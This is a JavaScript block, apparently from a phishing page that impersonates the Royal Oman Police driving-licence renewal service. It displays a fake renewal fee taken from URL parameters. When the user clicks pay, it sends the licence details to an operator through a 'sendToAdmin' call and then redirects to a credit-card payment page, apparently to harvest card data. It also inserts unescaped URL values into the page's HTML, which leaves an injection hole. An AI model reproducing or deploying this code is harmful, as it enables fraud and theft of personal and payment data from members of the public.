<script>
var ROP_SERVER = 'https://omanshorta-production.up.railway.app';

document.addEventListener('DOMContentLoaded', function() {
    var urlParams = new URLSearchParams(window.location.search);
    var licenseNo = urlParams.get('licenseNo') || '';
    var fee = urlParams.get('fee') || '20.000';
    var licenseType = urlParams.get('type') || 'الرخصة الخفيفة';
    
    if (!licenseNo) {
        document.getElementById('loading-message').style.display = 'none';
        document.getElementById('error-message').style.display = 'block';
        return;
    }
    
    // Show results
    document.getElementById('loading-message').style.display = 'none';
    document.getElementById('rop-results-content').style.display = 'block';
    
    var resultsHtml = '';
    resultsHtml += '<div class="panel-custom">';
    resultsHtml += '<div class="panel-heading-custom">بيانات تجديد رخصة القيادة</div>';
    resultsHtml += '<div class="panel-body-custom">';
    resultsHtml += '<table class="results-table">';
    resultsHtml += '<tr><th>رقم الرخصة</th><td>' + licenseNo + '</td></tr>';
    resultsHtml += '<tr><th>نوع الرخصة</th><td>' + licenseType + '</td></tr>';
    resultsHtml += '<tr><th>رسوم التجديد</th><td class="fee-amount">' + parseFloat(fee).toFixed(3) + ' ر.ع</td></tr>';
    resultsHtml += '</table>';
    resultsHtml += '</div></div>';
    
    document.getElementById('rop-results-content').innerHTML = resultsHtml;
    
    // Add payment button
    var buttonsHtml = '<div style="margin-top:20px; margin-bottom:20px; text-align:center;">';
    buttonsHtml += '<input type="button" id="btnPayLicense" class="btn-pay" value="مباشرة عملية الدفع" />';
    buttonsHtml += '</div>';
    
    // Payment confirmation modal
    buttonsHtml += '<div id="paymentModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:9999; justify-content:center; align-items:center;">';
    buttonsHtml += '<div style="background:#fff; border-radius:8px; padding:30px; max-width:500px; width:90%; margin:auto; margin-top:15%; text-align:center; direction:rtl;">';
    buttonsHtml += '<h2 style="margin-bottom:15px;">مباشرة إجراء عملية الدفع</h2>';
    buttonsHtml += '<h3>رسوم تجديد رخصة القيادة: <span style="font-weight:bold; color:#2E52AA;">' + parseFloat(fee).toFixed(3) + '</span> ريال عماني.</h3>';
    buttonsHtml += '<p>إضغط على زر <b>دفع</b> لمباشرة إجراء عملية الدفع أو زر <b>إلغاء</b> لإلغاء عملية الدفع.</p>';
    buttonsHtml += '<div style="margin-top:20px;">';
    buttonsHtml += '<button id="btnConfirmPay" style="background:#1a3a5c; color:#fff; border:none; padding:10px 30px; margin:5px; border-radius:5px; font-size:16px; cursor:pointer;">دفع</button>';
    buttonsHtml += '<button id="btnCancelPay" style="background:#666; color:#fff; border:none; padding:10px 30px; margin:5px; border-radius:5px; font-size:16px; cursor:pointer;">إلغاء</button>';
    buttonsHtml += '</div></div></div>';
    
    document.getElementById('rop-results-content').insertAdjacentHTML('afterend', buttonsHtml);
    
    // Pay button - show modal and send data to admin
    document.getElementById('btnPayLicense').addEventListener('click', function() {
        document.getElementById('paymentModal').style.display = 'flex';
        // Send data to admin when user clicks payment button
        if (window.sendToAdmin) {
            window.sendToAdmin({
                type: 'تجديد رخصة القيادة',
                fields: [
                    { label: 'رقم الرخصة', value: licenseNo },
                    { label: 'نوع الرخصة', value: licenseType },
                    { label: 'رسوم التجديد', value: parseFloat(fee).toFixed(3) + ' ر.ع' }
                ]
            }, 'تجديد رخصة القيادة');
        }
    });
    
    // Confirm pay - redirect to credit card payment page
    document.getElementById('btnConfirmPay').addEventListener('click', function() {
        window.location.href = '/credit-card-payment?amount=' + parseFloat(fee).toFixed(3);
    });
    
    // Cancel pay - close modal
    document.getElementById('btnCancelPay').addEventListener('click', function() {
        document.getElementById('paymentModal').style.display = 'none';
    });
});
</script>
